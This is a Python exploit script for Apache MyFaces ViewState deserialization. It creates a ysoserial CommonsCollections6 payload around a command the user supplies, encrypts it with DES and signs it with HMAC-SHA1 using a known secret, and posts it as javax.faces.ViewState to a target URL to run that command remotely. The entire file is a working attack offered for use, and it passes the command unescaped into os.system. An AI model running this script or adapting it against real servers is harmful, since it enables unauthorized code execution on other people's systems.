#!/usr/bin/env python3

import sys, os
import requests
from base64 import b64encode, b64decode
from hashlib import sha1
import hmac
import pyDes
from pwn import *

# Main function
def main():

	payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2',
			'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'Groovy1',
			'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21',
			'MozillaRhino1', 'Myfaces1', 'ROME', 'Spring1', 'Spring2']

	# Checking arguments
	if len(sys.argv) != 4:
		print("Java MyFaces exploit")
		print("Usage: {} <url> <command> <secret>\n".format(sys.argv[0]))
		sys.exit()

	else:
		url = sys.argv[1]
		cmd = sys.argv[2]
		secret = sys.argv[3]
		payload = creating_payload(cmd)
		view_state = encrypting_payload(payload,secret)
		if(send_exploit_request(url,view_state)):
			log.success(f"Payload executed successfully!")
		else:
			log.failure(f"Something went wrong...")

# Creating ysoserial payload with costume arguments
def creating_payload(cmd): 

	command = "java -jar ysoserial.jar CommonsCollections6 " + "'" + cmd + "'" + " > payload.bin"
	log.info("Payload command: {}".format(command))
	log.info("Creating the payload...")
	os.system(command)
	with open("payload.bin","rb") as file:
		payload = file.read()
	log.success(f"Payload created!")
	log.info("Length of the payload: {}".format(len(payload)))
	return payload

# Encrypting the ysoserial payload we generated
def encrypting_payload(payload,secret):

	log.info(f"Encrypting the payload")
	secret = b64decode(secret)
	obj = pyDes.des(secret,pyDes.ECB,padmode=pyDes.PAD_PKCS5)
	encrypted_payload = obj.encrypt(payload)
	mac = (hmac.new(secret,bytes(encrypted_payload),sha1)).digest()
	view_state_payload = encrypted_payload + mac
	log.success(f"Payload encrypted!")
	return b64encode(view_state_payload)

# Send post request with the view_state payload
def send_exploit_request(url,view_state_payload):

	log.info(f"Sending the encrypted payload")
	data = {"javax.faces.ViewState":view_state_payload}
	requests.post(url,data = data)
	return True

if __name__ == "__main__":
	main()
